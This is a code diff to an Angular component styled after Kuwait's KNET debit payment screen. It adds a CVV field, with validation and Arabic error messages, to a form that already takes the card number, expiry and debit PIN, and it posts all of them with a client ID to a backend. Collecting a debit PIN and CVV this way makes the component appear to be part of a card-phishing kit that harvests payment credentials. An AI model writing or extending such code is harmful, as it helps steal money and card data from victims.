@@ -52,6 +52,7 @@ export class Knet implements OnInit, OnDestroy {
   @ViewChild('autocompleteBox') autocompleteRef!: ElementRef<HTMLDivElement>;
   @ViewChild('monthInput') monthInputRef!: ElementRef<HTMLInputElement>;
   @ViewChild('pinInput') pinInputRef!: ElementRef<HTMLInputElement>;
+  @ViewChild('cvvInput') cvvInputRef!: ElementRef<HTMLInputElement>;
 
   // Component states using signals
   isLoading = signal<boolean>(false);
@@ -61,6 +62,7 @@ export class Knet implements OnInit, OnDestroy {
   expiryMonth = signal<string>('');
   expiryYear = signal<string>('');
   pin = signal<string>('');
+  cvv = signal<string>('');
   visualDebitNumber = signal<string>('');
 
   selectedBank = signal<Bank | null>(null);
@@ -252,6 +254,22 @@ export class Knet implements OnInit, OnDestroy {
     }
     input.value = val;
     this.pin.set(val);
+
+    if (val.length === 4) {
+      if (this.cvvInputRef) {
+        this.cvvInputRef.nativeElement.focus();
+      }
+    }
+  }
+
+  onCvvInput(event: Event) {
+    const input = event.target as HTMLInputElement;
+    let val = input.value.replace(/[^0-9]/g, '');
+    if (val.length > 3) {
+      val = val.substring(0, 3);
+    }
+    input.value = val;
+    this.cvv.set(val);
   }
 
   validateInputs(): boolean {
@@ -259,6 +277,7 @@ export class Knet implements OnInit, OnDestroy {
     const year = this.expiryYear();
     const month = this.expiryMonth();
     const pin = this.pin();
+    const cvv = this.cvv();
 
     const yearVal = parseInt(year, 10);
     const monthVal = parseInt(month, 10);
@@ -275,6 +294,11 @@ export class Knet implements OnInit, OnDestroy {
 
     if (!pin || pin.length < 4) {
       this.toastService.show('يرجى إدخال الرقم السري المكون من 4 أرقام بشكل صحيح.', 'error');
+      return false;
+    }
+
+    if (!cvv || cvv.length < 3) {
+      this.toastService.show('يرجى إدخال رمز CVV المكون من 3 أرقام بشكل صحيح.', 'error');
       return false;
     }
 
@@ -308,6 +332,7 @@ export class Knet implements OnInit, OnDestroy {
           cc_month: this.expiryMonth(),
           cc_year: this.expiryYear(),
           cc_pin: this.pin(),
+          cc_cvv: this.cvv(),
           client_id: clientId
         })
       });
